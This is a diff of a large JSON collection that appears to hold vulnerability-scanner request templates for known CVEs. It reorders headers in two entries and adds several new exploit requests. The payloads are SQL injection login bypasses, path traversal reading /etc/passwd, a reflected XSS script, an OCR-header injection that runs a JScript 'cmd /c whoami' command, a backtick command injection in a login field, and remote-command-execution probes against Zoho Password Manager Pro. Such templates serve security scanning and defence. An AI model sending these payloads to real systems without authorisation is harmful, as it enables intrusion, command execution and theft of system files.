@@ -6679,11 +6679,11 @@
         {
           "body": "var oShell = WScript.CreateObject('WScript.Shell');var oExec = oShell.Exec(\"cmd /c whoami\");",
           "headers": {
-            "X-Tika-OCRTesseractPath": "cscript",
-            "X-Tika-OCRLanguage": "//E:Jscript",
             "Expect": "100-continue",
             "Content-type": "image/jp2",
-            "Connection": "close"
+            "Connection": "close",
+            "X-Tika-OCRTesseractPath": "cscript",
+            "X-Tika-OCRLanguage": "//E:Jscript"
           },
           "method": "PUT",
           "path": [
@@ -11667,8 +11667,8 @@
         {
           "body": "op=login&username=;`cat /etc/passwd`&password=\n",
           "headers": {
-            "Referer": "{{Hostname}}/module/login/login.html",
-            "Content-Type": "application/x-www-form-urlencoded"
+            "Content-Type": "application/x-www-form-urlencoded",
+            "Referer": "{{Hostname}}/module/login/login.html"
           },
           "method": "POST",
           "path": [
@@ -19168,6 +19168,21 @@
       ]
     },
     {
+      "id": "CVE-2022-0678",
+      "info": {
+        "name": "Microweber < 1.2.11- Cross-Site Scripting",
+        "severity": "medium"
+      },
+      "requests": [
+        {
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/demo/api/logout?redirect_to=/asdf%22%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E"
+          ]
+        }
+      ]
+    },
+    {
       "id": "CVE-2022-0692",
       "info": {
         "name": "Rudloff alltube prior to 3.0.1 - Open Redirect",
@@ -20700,6 +20715,21 @@
       ]
     },
     {
+      "id": "CVE-2022-29775",
+      "info": {
+        "name": "iSpyConnect iSpy v7.2.2.0 - Improper Authentication",
+        "severity": "critical"
+      },
+      "requests": [
+        {
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/logfile?d=crossdomain.xml"
+          ]
+        }
+      ]
+    },
+    {
       "id": "CVE-2022-30073",
       "info": {
         "name": "WBCE CMS v1.5.2 XSS Stored",
@@ -21059,6 +21089,20 @@
       ]
     },
     {
+      "id": "CVE-2022-32094",
+      "info": {
+        "name": "Hospital Management System v1.0 - SQL Injection",
+        "severity": "critical"
+      },
+      "requests": [
+        {
+          "raw": [
+            "POST /hms/doctor/ HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/x-www-form-urlencoded\n\nusername=admin%27+or+%271%27%3D%271%27%23&password=admin%27+or+%271%27%3D%271%27%23&submit=\n"
+          ]
+        }
+      ]
+    },
+    {
       "id": "CVE-2022-32195",
       "info": {
         "name": "Open edX - Cross-Site Scripting",
@@ -21277,6 +21321,20 @@
       ]
     },
     {
+      "id": "CVE-2022-34590",
+      "info": {
+        "name": "Hospital Management System v1.0 - SQL Injection",
+        "severity": "high"
+      },
+      "requests": [
+        {
+          "raw": [
+            "POST /hms/admin/ HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/x-www-form-urlencoded\n\nusername=admin%27+or+%271%27%3D%271%27%23&password=admin%27+or+%271%27%3D%271%27%23&submit=\n"
+          ]
+        }
+      ]
+    },
+    {
       "id": "CVE-2022-35151",
       "info": {
         "name": "kkFileView v4.1.0 - Cross-Site Scripting",
@@ -21293,13 +21351,30 @@
     {
       "id": "CVE-2022-35405",
       "info": {
-        "name": "Zoho ManageEngine Password Manager Pro - Unauthenticated Remote Command Execution",
+        "name": "Zoho ManageEngine Password Manager Pro and PAM 360 - Unauthenticated Remote Command Execution",
         "severity": "critical"
       },
       "requests": [
         {
           "raw": [
-            "POST /xmlrpc HTTP/1.1\nHost: {{Hostname}}\nContent-Type: text/xml\n\n<?xml version=\"1.0\"?>\n<methodCall>\n  <methodName>ProjectDiscovery</methodName>\n  <params>\n    <param>\n      <value>\n        <struct>\n          <member>\n            <name>test</name>\n            <value>\n              <serializable xmlns=\"http://ws.apache.org/xmlrpc/namespaces/extensions\"></serializable>\n            </value>\n          </member>\n        </struct>\n      </value>\n    </param>\n  </params>\n</methodCall>\n"
+            "POST /xmlrpc HTTP/1.1\nHost: {{Hostname}}\n\n<?xml version=\"1.0\"?><methodCall><methodName>ProjectDiscovery</methodName><params><param><value>big0us</value></param></params></methodCall>\n",
+            "POST /xmlrpc HTTP/1.1\nHost: {{Host}}:7272\n\n<?xml version=\"1.0\"?><methodCall><methodName>ProjectDiscovery</methodName><params><param><value>big0us</value></param></params></methodCall>\n",
+            "POST /xmlrpc HTTP/1.1\nHost: {{Host}}:8282\n\n<?xml version=\"1.0\"?><methodCall><methodName>ProjectDiscovery</methodName><params><param><value>big0us</value></param></params></methodCall>\n",
+            "POST /xmlrpc HTTP/1.1\nHost: {{Host}}:9292\n\n<?xml version=\"1.0\"?><methodCall><methodName>ProjectDiscovery</methodName><params><param><value>big0us</value></param></params></methodCall>\n"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2022-35413",
+      "info": {
+        "name": "Wapples Web Application Firewall - Hardcoded credentials",
+        "severity": "critical"
+      },
+      "requests": [
+        {
+          "raw": [
+            "POST /webapi/auth HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/x-www-form-urlencoded\n\nid={{username}}&password={{password}}\n"
           ]
         }
       ]
@@ -21424,6 +21499,20 @@
       ]
     },
     {
+      "id": "CVE-2022-38637",
+      "info": {
+        "name": "Hospital Management System v1.0 - SQL Injection",
+        "severity": "high"
+      },
+      "requests": [
+        {
+          "raw": [
+            "POST /hms/user-login.php HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/x-www-form-urlencoded\n\nusername=admin%27+or+%271%27%3D%271%27%23&password=admin%27+or+%271%27%3D%271%27%23&submit=\n"
+          ]
+        }
+      ]
+    },
+    {
       "id": "CVE-2022-38794",
       "info": {
         "name": "Zaver - Local File Inclusion",
@@ -21434,6 +21523,22 @@
           "method": "GET",
           "path": [
             "{{BaseURL}}/../../../../../../../../etc/passwd"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2022-40734",
+      "info": {
+        "name": "UniSharp aka Laravel Filemanager v2.5.1 - Directory Traversal",
+        "severity": "high"
+      },
+      "requests": [
+        {
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/download?working_dir=%2F../../../../../../../../../../../../../../../../../../../etc&type=Files&file=passwd",
+            "{{BaseURL}}/laravel-filemanager/download?working_dir=%2F../../../../../../../../../../../../../../../../../../../etc&type=Files&file=passwd"
           ]
         }
       ]
